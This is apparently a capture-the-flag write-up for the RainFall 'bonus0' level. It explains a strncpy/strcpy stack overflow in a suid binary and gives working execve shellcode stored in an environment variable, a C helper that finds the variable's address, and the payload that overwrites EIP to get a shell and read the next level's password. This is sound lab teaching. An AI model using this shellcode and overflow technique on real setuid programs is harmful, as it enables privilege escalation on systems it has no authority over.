Once we are logged as bonus0

We are presented with a suid binary.

We try executing it
bonus0@RainFall:~$ ./bonus0
 -
asdfasd
 -
as
asdfasd as
bonus0@RainFall:~$

It seems that it create a new string containing the two inputed strings.

After analysing the asm of the executable, we found three functions a main, p and pp

The main() function has a buffer variable with 54 bytes. We try to overflow it by exploiting the read and strncpy function.

The p() function has a read call that allow us to read 4096 with a non-terminated string and copy 20bytes to the buffer using strncpy (In strncpy if the source is bigger
than the size, the destination ends with a non-terminated character)

So pp() function reads 2 (we will call them a and b) variables and copy them in the main buffer variable. So if the first buffer is non null-terminated the first strcpy will copy
40bytes into the buffer since the next string in the stack after a is b. Then it copies a space which makes now 41bytes + the last string 20bytes. Which leaves
us with 61bytes(61bytes - 54bytes = 7bytes).

We will be able to write 19bytes into the stack we just need to find the offset in which we will overwrite the eip.

(gdb) run
Starting program: /home/user/bonus0/bonus0
 -
AAAAAAAAAAAAAAAAAAAA
 -
Aa0Aa1Aa2Aa3Aa4Aa5Aa
AAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa�� Aa0Aa1Aa2Aa3Aa4Aa5Aa��

Program received signal SIGSEGV, Segmentation fault.
0x41336141 in ?? () offset is 9

To spawn a shell we need a shellcode. We don't have where to store it so we need to put it in a env variable
bonus0@RainFall:~$ export SHELLCODE=$(python -c "print '\x90'*64+'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'")

And we will use this function to get its address
bonus0@RainFall:~$ cat > /tmp/getenv.c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[])
{
	printf("%s is at %p\n", argv[1], getenv(argv[1]));
}
bonus0@RainFall:~$ cd /tmp/
bonus0@RainFall:/tmp$ gcc getenv.c
bonus0@RainFall:/tmp$ ./a.out SHELLCODE
SHELLCODE is at 0xbffff8ab


bonus0@RainFall:~$ python -c "print 'A'*4095 + '\n' + 'B'*9 + '\xab\xf8\xff\xbf'+ 'C'*7" > /tmp/as
bonus0@RainFall:~$ cat /tmp/as - | ./bonus0
 -
 -
AAAAAAAAAAAAAAAAAAAABBBBBBBBB����CCCCCCC�� BBBBBBBBB����CCCCCCC��
whoami
bonus1
cd /home/user/bonus1

cat .pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9

And that's how we got the flag for bonus1.
